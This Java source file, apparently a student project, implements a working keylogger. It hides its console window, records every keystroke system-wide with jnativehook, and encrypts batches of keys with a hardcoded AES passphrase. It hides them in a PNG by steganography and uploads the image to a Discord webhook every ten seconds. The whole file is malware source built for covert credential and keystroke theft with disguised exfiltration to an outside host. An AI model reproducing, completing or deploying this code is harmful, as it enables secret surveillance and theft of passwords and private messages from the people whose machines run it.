package ge.edu.sangu;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.crypto.SecretKey;
import java.io.File;
import java.util.*;
import java.util.logging.Level;


/**
 * @author vakho
 * @author 00kariim & haitam
 */


public class KeyLogger implements NativeKeyListener {

	private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
	private static final String IMAGE_INPUT = "opm.png";
	private static final String IMAGE_OUTPUT = "output.png";
	private static final String DISCORD_WEBHOOK_URL = System.getenv("WEBHOOK_URL");

	private static final SecretKey FIXED_KEY = AESUtil.generateKey("secretpassphrase");
	private static final List<String> buffer = new ArrayList<>();
	private static final int BUFFER_SIZE = 100;

	public static void main(String[] args) {
		logger.info("Key logger demarra");

		ProcessHider.hideConsoleWindow();
		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			logger.error(e.getMessage(), e);
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());

		new Timer().schedule(new TimerTask() {
			@Override
			public void run() {
				File output = new File(IMAGE_OUTPUT);
				if (output.exists()) {
					try {
						DiscordWebhookSender.sendImage(DISCORD_WEBHOOK_URL, output);
						System.out.println(" Image envoyée à Discord : " + IMAGE_OUTPUT);
						output.delete();
					} catch (Exception ex) {
						logger.error("Erreur envoi Discord", ex);
					}
				} else {
					System.out.println("️ Aucune image à envoyer.");
				}
			}
		}, 0, 10000); // 10.000 hia d9i9a
	}

	private static void init() {
		java.util.logging.Logger jLogger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		jLogger.setLevel(Level.WARNING);
		jLogger.setUseParentHandlers(false);
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

		String cleanKey = keyText.length() > 1 ? "[" + keyText + "]" : keyText;


		buffer.add(cleanKey);


		if (buffer.size() >= BUFFER_SIZE) {
			try {
				String combined = String.join(" ", buffer);


				String encrypted = AESUtil.encrypt(combined, FIXED_KEY);


				File inputImage = new File(IMAGE_INPUT);
				if (!inputImage.exists()) {
					System.err.println("Image source introuvable : " + IMAGE_INPUT);
					return;
				}

				ImageSteganography.embedMessage(encrypted, IMAGE_INPUT, IMAGE_OUTPUT);

				// Test d'extraction 
				String testExtracted = ImageSteganography.extractMessage(IMAGE_OUTPUT);

				buffer.clear();
			} catch (Exception ex) {
				logger.error("Erreur traitement des touches", ex);
				ex.printStackTrace();
			}
		}
	}
	@Override public void nativeKeyReleased(NativeKeyEvent e) {}
	@Override public void nativeKeyTyped(NativeKeyEvent e) {}
}
